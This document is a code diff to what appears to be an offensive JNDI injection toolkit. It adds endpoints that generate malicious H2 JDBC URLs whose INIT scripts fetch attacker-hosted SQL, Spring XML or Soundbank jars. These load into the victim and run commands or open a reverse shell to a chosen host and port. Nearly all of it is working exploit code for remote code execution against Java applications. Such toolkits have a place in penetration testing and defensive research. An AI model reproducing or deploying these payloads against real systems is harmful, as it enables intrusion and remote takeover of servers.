@@ -10,7 +10,8 @@ import map.jndi.payload.SpringXmlPayload;
 import map.jndi.server.WebServer;
 import map.jndi.template.DerbyJarTemplate;
 import map.jndi.template.ReverseShellTemplate;
-import map.jndi.template.SoundbankTemplate;
+import map.jndi.template.SoundbankCmd;
+import map.jndi.template.SoundbankReverseShell;
 import map.jndi.util.JarUtil;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
@@ -215,7 +216,7 @@ public abstract class DatabaseController implements Controller {
         String className = MiscUtil.getRandStr(12);
 
         ClassPool pool = ClassPool.getDefault();
-        CtClass clazz = pool.get(SoundbankTemplate.class.getName());
+        CtClass clazz = pool.get(SoundbankCmd.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
         ReflectUtil.setCtField(clazz, "cmd", CtField.Initializer.constant(cmd));
 
@@ -241,6 +242,46 @@ public abstract class DatabaseController implements Controller {
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
         props.setProperty("url", url);
+
+        return props;
+    }
+
+    @JNDIMapping("/H2/JRE/Soundbank/ReverseShell/{host}/{port}")
+    public Properties h2JRESoundbankReverseShell(String host, String port) throws Exception {
+        System.out.println("[H2-JRE] [ReverseShell] Host: " + host + " Port: " + port);
+
+        String jarName = MiscUtil.getRandStr(12) + ".jar";
+        String className = MiscUtil.getRandStr(12);
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(SoundbankReverseShell.class.getName());
+        clazz.replaceClassName(clazz.getName(), className);
+        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
+        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
+
+        byte[] jarBytes = JarUtil.createWithSPI("javax.sound.midi.Soundbank", className, clazz.toBytecode());
+        WebServer.getInstance().serveFile("/" + jarName, jarBytes);
+
+        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
+        String sqlContent = "CREATE ALIAS NEW_INSTANCE FOR 'org.h2.util.Utils.newInstance(java.lang.String, java.lang.Object[])';\n" +
+                "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
+                "CREATE ALIAS SET_PROPERTY FOR 'java.lang.System.setProperty(java.lang.String, java.lang.String)';\n" +
+                "CREATE ALIAS GET_SOUNDBANK FOR 'javax.sound.midi.MidiSystem.getSoundbank(java.net.URL)';\n" +
+                "SET @clazz = 'java.net.URL';\n" +
+                "SET @url_str = '" + Config.codebase + jarName + "';\n" +
+                "SET @url_obj = UNESCAPE_VALUE(@url_str);\n" +
+                "SET @obj = NEW_INSTANCE(@clazz, @url_obj);\n" +
+                "CALL SET_PROPERTY('jdk.sound.jarsoundbank', 'true');\n" +
+                "CALL GET_SOUNDBANK(@obj);";
+        WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
+
+        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
+                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";
+
+        Properties props = new Properties();
+        props.setProperty("driver", "org.h2.Driver");
+        props.setProperty("url", url);
+
         return props;
     }
 
@@ -250,6 +291,46 @@ public abstract class DatabaseController implements Controller {
 
         String xmlFileName = MiscUtil.getRandStr(12) + ".xml";
         String xmlContent = SpringXmlPayload.command(cmd);
+        WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());
+
+        String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
+        String sqlContent = "CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';\n" +
+                "CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';\n" +
+                "CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';\n" +
+                "\n" +
+                "SET @url_str='" + Config.codebase + xmlFileName + "';\n" +
+                "SET @url_obj=UNESCAPE_VALUE(@url_str);\n" +
+                "SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');\n" +
+                "SET @string_clazz=CLASS_FOR_NAME('java.lang.String');\n" +
+                "\n" +
+                "CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);";
+        WebServer.getInstance().serveFile("/" + sqlFileName, sqlContent.getBytes());
+
+        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
+                "INIT=RUNSCRIPT FROM '" + Config.codebase + sqlFileName + "'";
+
+        Properties props = new Properties();
+        props.setProperty("driver", "org.h2.Driver");
+        props.setProperty("url", url);
+
+        return props;
+    }
+
+    @JNDIMapping("/H2/JRE/Spring/ReverseShell/{host}/{port}")
+    public Properties h2JRESpringReverseShell(String host, String port) throws Exception {
+        System.out.println("[H2-JRE] [Spring] [ReverseShell] Host: " + host + " Port: " + port);
+
+        String className = MiscUtil.getRandStr(12);
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
+        clazz.replaceClassName(clazz.getName(), className);
+
+        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
+        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
+        byte[] byteCode = clazz.toBytecode();
+
+        String xmlFileName = MiscUtil.getRandStr(12) + ".xml";
+        String xmlContent = SpringXmlPayload.loadClass(className, byteCode);
         WebServer.getInstance().serveFile("/" + xmlFileName, xmlContent.getBytes());
 
         String sqlFileName = MiscUtil.getRandStr(12) + ".sql";
